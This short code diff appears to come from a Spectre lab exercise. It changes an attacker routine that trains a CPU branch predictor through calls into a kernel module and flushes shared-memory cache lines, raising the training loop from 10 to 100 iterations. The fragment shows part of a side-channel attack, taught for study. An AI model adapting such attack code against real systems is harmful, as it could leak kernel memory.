@@ -51,9 +51,11 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         int best_i = -1;
         for (int trial = 0; trial < 100; trial++) {
             // Train Branch Predictor
-            for (int train = 0; train < 10; train++) {
+            for (int train = 0; train < 100; train++) {
                 call_kernel_part3(kernel_fd, shared_memory, train % 4);
             }
+
+
 
             for (int i = 0; i < 256; i++) {
                 clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
